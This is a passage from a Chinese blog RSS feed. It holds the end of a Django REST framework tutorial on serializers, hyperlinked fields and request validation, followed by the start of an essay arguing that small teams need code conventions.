                    name &lt;/span&gt;=&lt;span&gt; serializers.CharField()
                    pwd &lt;/span&gt;=&lt;span&gt; serializers.CharField()
                    group_id &lt;/span&gt;=&lt;span&gt; serializers.CharField()
                    xxxx &lt;/span&gt;= serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
                    x1 &lt;/span&gt;= serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.mu.name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)



                &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                        self.dispatch
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                        user_list =&lt;span&gt; models.UserInfo.objects.all()
                        ser &lt;/span&gt;= UsersSerializer(instance=user_list,many=&lt;span&gt;True)
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(ser.data)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;c、复杂序列化&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;解决方案一：
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyCharField(serializers.CharField):

                        &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; to_representation(self, value):
                            data_list &lt;/span&gt;=&lt;span&gt; []
                            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; row &lt;span&gt;in&lt;/span&gt;&lt;span&gt; value:
                                data_list.append(row.name)
                            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; data_list

                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.Serializer):
                        name &lt;/span&gt;= serializers.CharField() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.name&lt;/span&gt;
                        pwd = serializers.CharField()  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.pwd&lt;/span&gt;
                        group_id = serializers.CharField() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.group_id&lt;/span&gt;
                        xxxx = serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.group.title&lt;/span&gt;
                        x1 = serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.mu.name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.mu.name&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; x2 = serializers.CharField(source=&quot;roles.all&quot;) # obj.mu.name&lt;/span&gt;
                        x2 = MyCharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;roles.all&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.mu.name&lt;/span&gt;
&lt;span&gt;    
                解决方案二：
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyCharField(serializers.CharField):
                        &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; to_representation(self, value):
                            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:value.pk, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:value.name}

                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.Serializer):
                        name &lt;/span&gt;= serializers.CharField() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.name&lt;/span&gt;
                        pwd = serializers.CharField()  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.pwd&lt;/span&gt;
                        group_id = serializers.CharField() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.group_id&lt;/span&gt;
                        xxxx = serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.group.title&lt;/span&gt;
                        x1 = serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.mu.name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.mu.name&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; x2 = serializers.CharField(source=&quot;roles.all&quot;) # obj.mu.name&lt;/span&gt;
                        x2 = serializers.ListField(child=MyCharField(),source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;roles.all&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.mu.name&lt;/span&gt;
&lt;span&gt;
                解决方案三（&lt;/span&gt;*&lt;span&gt;）：
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.Serializer):
                        name &lt;/span&gt;= serializers.CharField() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.name&lt;/span&gt;
                        pwd = serializers.CharField()  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.pwd&lt;/span&gt;
                        group_id = serializers.CharField() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.group_id&lt;/span&gt;
                        xxxx = serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.group.title&lt;/span&gt;
                        x1 = serializers.CharField(source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;group.mu.name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; obj.mu.name&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; x2 = serializers.CharField(source=&quot;roles.all&quot;) # obj.mu.name&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; x2 = serializers.ListField(child=MyCharField(),source=&quot;roles.all&quot;) # obj.mu.name&lt;/span&gt;
                        x2 =&lt;span&gt; serializers.SerializerMethodField()

                        &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_x2(self,obj):
                            obj.roles.all()
                            role_list &lt;/span&gt;= obj.roles.filter(id__gt=1&lt;span&gt;)
                            data_list &lt;/span&gt;=&lt;span&gt; []
                            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; row &lt;span&gt;in&lt;/span&gt;&lt;span&gt; role_list:
                                data_list.append({&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;pk&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:row.pk,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:row.name})
                            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; data_list&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;以上三种都是使用相同的视图：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                        &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                            self.dispatch
                            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                            user_list =&lt;span&gt; models.UserInfo.objects.all()
                            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [obj1,obj2,obj3]&lt;/span&gt;
                            ser = UsersSerializer(instance=user_list,many=&lt;span&gt;True)
                            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(ser.data)&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;d. 基于Model&lt;/strong&gt;   &lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.ModelSerializer):
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Meta:
                        model &lt;/span&gt;=&lt;span&gt; models.UserInfo
                        fields &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__all__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; fields = ['name', 'pwd','group']&lt;/span&gt;
                        depth = 1


                &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                        self.dispatch
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                        user_list =&lt;span&gt; models.UserInfo.objects.all()
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [obj1,obj2,obj3]&lt;/span&gt;
                        ser = UsersSerializer(instance=user_list,many=&lt;span&gt;True)
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(ser.data)&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;e. 生成URL&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.ModelSerializer):
                    group &lt;/span&gt;= serializers.HyperlinkedIdentityField(view_name=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;detail&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Meta:
                        model &lt;/span&gt;=&lt;span&gt; models.UserInfo
                        fields &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__all__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                        fields &lt;/span&gt;= [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;pwd&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;group&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
                        depth &lt;/span&gt;= 1


                &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                        self.dispatch
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                        user_list =&lt;span&gt; models.UserInfo.objects.all()
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [obj1,obj2,obj3]&lt;/span&gt;
                        ser = UsersSerializer(instance=user_list,many=True,context={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;request&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:request})
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(ser.data)&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;f. 全局生成URL&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.HyperlinkedModelSerializer):
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Meta:
                        model &lt;/span&gt;=&lt;span&gt; models.UserInfo
                        fields &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__all__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; fields = ['id','name','pwd']&lt;/span&gt;

                &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                        self.dispatch
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                        user_list =&lt;span&gt; models.UserInfo.objects.all()
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [obj1,obj2,obj3]&lt;/span&gt;
                        ser = UsersSerializer(instance=user_list,many=True,context={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;request&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:request})
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(ser.data)&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;请求数据验证：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;a、&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;strong&gt;&lt;span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; PasswordValidator(object):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self, base):
                        self.base &lt;/span&gt;=&lt;span&gt; base

                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__call__&lt;/span&gt;&lt;span&gt;(self, value):
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; value !=&lt;span&gt; self.base:
                            message &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;用户输入的值必须是 %s.&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt; self.base
                            &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;&lt;span&gt; serializers.ValidationError(message)

                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; set_context(self, serializer_field):
                        &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
                        This hook is called by the serializer instance,
                        prior to the validation call being made.
                        &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 执行验证之前调用,serializer_fields是当前字段对象&lt;/span&gt;
                        &lt;span&gt;pass&lt;/span&gt;

                &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.Serializer):
                        name &lt;/span&gt;= serializers.CharField(min_length=6&lt;span&gt;)
                        pwd &lt;/span&gt;= serializers.CharField(error_messages={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;required&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;密码不能为空&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;}, validators=[PasswordValidator(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;666&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)])&lt;/span&gt;&lt;/strong&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;b、&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; PasswordValidator(object):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self, base):
                        self.base &lt;/span&gt;=&lt;span&gt; base

                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__call__&lt;/span&gt;&lt;span&gt;(self, value):
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; value !=&lt;span&gt; self.base:
                            message &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;用户输入的值必须是 %s.&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt; self.base
                            &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;&lt;span&gt; serializers.ValidationError(message)

                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; set_context(self, serializer_field):
                        &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
                        This hook is called by the serializer instance,
                        prior to the validation call being made.
                        &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 执行验证之前调用,serializer_fields是当前字段对象&lt;/span&gt;
                        &lt;span&gt;pass&lt;/span&gt;

                &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.ModelSerializer):
                    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Meta:
                        model &lt;/span&gt;=&lt;span&gt; models.UserInfo
                        fields &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__all__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                        extra_kwargs &lt;/span&gt;=&lt;span&gt; {
                            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;min_length&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: 6&lt;span&gt;},
                            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;pwd&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;validators&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: [PasswordValidator(666&lt;span&gt;), ]}
                        }&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;使用：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                        self.dispatch
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                        user_list =&lt;span&gt; models.UserInfo.objects.all()
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [obj1,obj2,obj3]&lt;/span&gt;
                        ser = UsersSerializer(instance=user_list,many=True,context={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;request&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:request})
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Response(ser.data)

                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; post(self,request,*args,**&lt;span&gt;kwargs):
                        ser &lt;/span&gt;= UsersSerializer(data=&lt;span&gt;request.data)
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; ser.is_valid():
                            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(ser.validated_data)
                        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(ser.errors)
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;...&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;









</description>
<pubDate>Wed, 07 Feb 2018 12:23:00 +0000</pubDate>
<dc:creator>孟庆健</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mengqingjian/p/8428053.html</dc:identifier>
</item>
<item>
<title>项目微管理5 - 规范 - 沙场秋点兵</title>
<link>http://www.cnblogs.com/dxy1982/p/8427805.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dxy1982/p/8427805.html</guid>
<description>&lt;p&gt;从鼬加入的那一周开始，四代就开始着手准备起草代码规范了。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;代码规范不可少&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;很多人理直气壮的认为，创业团队，或者说人数少的团队根本不需要代码规范。&lt;/p&gt;

&lt;p&gt;他们的口头禅经常是：“没办法啊！我们需要快速的完成客户的需求啊！客户最重要啊！实行代码规范只会拖慢项目的进度！而且时间太紧，我们也不能搞那么多的学习啊！”。&lt;/p&gt;
&lt;div&gt; &lt;img src=&quot;https://images2017.cnblogs.com/blog/109061/201802/109061-20180207190948935-98904061.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;

&lt;p&gt;对于四代来讲，不采用规范的做法其实无异于是“饮鸩止渴”，暂时的无限制的代码提交确实很爽，在项目初期确实可能有助于快速完成需求的功能，但是这种鼠目寸光的做法，如果不尽早改正过来，一旦形成惯性，积重难返，对于只是玩玩的项目来说还没什么太大的副作用，不过对于想要长期发展的项目来说，这几乎就百分百会造成深远的影响，甚至严重一点就是灭顶之灾。&lt;/p&gt;

&lt;p&gt;随意提交的代码导致的代码随意的堆砌，最后很可能是造成代码修改起来无比的困难，越往后越难以维护，最后只能是在团队一片哭爹喊娘的叫喊声中，项目迎来寿终正寝。四代真的不知道这种不负责任的结论还会影响多少人，还会终结多少项目啊！&lt;/p&gt;

&lt;p&gt;对于“没时间，项目紧”这一点，四代觉的完全是扯淡，完全是借口，从四代的经历来看，&lt;span&gt;&lt;strong&gt;任何的团队都需要代码规范，而且团队熟练掌握代码规范后，写代码并不会增加多少时间成本&lt;/strong&gt;&lt;/span&gt;！对四代来说，许多的“清规戒律”之所以在很多的团队执行不下去，完全是团队管理者造成的，管理者的懒惰和不作为导致了团队的低效。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;代码的作用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;说到代码规范，就必须要首先理解代码的作用。扯淡！谁不懂代码啊？这还用讨论吗！答案是：用！&lt;/p&gt;

&lt;p&gt;在四代看来，&lt;strong&gt;&lt;span&gt;代码存在两个方面的作用，第一个作用是与机器对话，第二个作用是与团队对话&lt;/span&gt;&lt;/strong&gt;。第一个是从个人和技术角度讲，第二个是从团队和沟通上讲。&lt;/p&gt;
&lt;div&gt; &lt;img src=&quot;https://images2017.cnblogs.com/blog/109061/201802/109061-20180207191126201-447316512.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;

&lt;p&gt;对于四代来说，写代码存在有两个层次，也就是说，在四代的眼中，软件工程师至少存在两个等级，一个是初级，一个是高级，初级软件工程师能写出机器能懂的代码，也就是说编译没问题，运行很正确，但是&lt;span&gt;&lt;strong&gt;高级软件工程师能写出人能懂的代码&lt;/strong&gt;&lt;/span&gt;，也就是不仅编译没问题，运行很正确，关键是团队其他人还能读懂，这就是优秀的软件工程师最牛逼的地方，没有“之一”。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;对于一个团队来说，有什么会比代码的传承性更重要吗？没有！&lt;/span&gt;&lt;/strong&gt;即使是只有一个人的团队也是如此，谁能牛逼到面对自己一段杂乱不堪的代码，在几个月以后还了如指掌！时至今日，代码在沟通上的容易与否，也就是代码的沟通成本，或者说维护成本，是衡量代码好坏的最重要的特征了，这里同样没有“之一”。&lt;/p&gt;

&lt;p&gt;为了让代码便于沟通，为了让团队合作更加高效，确实应该制定团队基本的代码规范！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;代码规范那些事&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;代码规范这个事，毋庸置疑，大家绝对是赞同的，尽管很多人目前不会执行，反正大家认为这个玩意儿应该有。但是这个东东严格来说是没有标准的，不同的人有不同的看法。四代认为：对于一个团队来说，不管采用何种规范，只要做好三件事就可以了&lt;strong&gt;&lt;span&gt;：第一件事是尽快执行下去，第二件事是坚决执行下去，第三件事是坚持执行下去&lt;/span&gt;&lt;/strong&gt;。&lt;/p&gt;

&lt;div&gt; &lt;img src=&quot;https://images2017.cnblogs.com/blog/109061/201802/109061-20180207192340466-1880131320.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;

&lt;p&gt;首先得具有这个坚决的态度，这是做这件事的前提条件，否则说什么都是白扯，四代见过太多在团队中扯淡的人和事了！说的很好听，可实际上一旦谈到落实，就闭口不言！&lt;/p&gt;

&lt;p&gt;其次，四代觉得对于代码规范本身，有几点还是需要注意的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第一点，代码规范最好是明确的规范。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;比如下面这些就是比较模糊的规范：&lt;/p&gt;

&lt;div&gt;
&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;/colgroup&gt;&lt;tbody readability=&quot;1.5&quot;&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td data-cell-id=&quot;3116-1517906063561-cell-0-0&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;1. 变量应该不要太长。&lt;/p&gt;
&lt;p&gt;2. 变量名应该清晰易懂。&lt;/p&gt;
&lt;p&gt;3. 函数体不要太啰嗦。&lt;/p&gt;
&lt;p&gt;4. 类不要太大。&lt;/p&gt;
&lt;/td&gt;
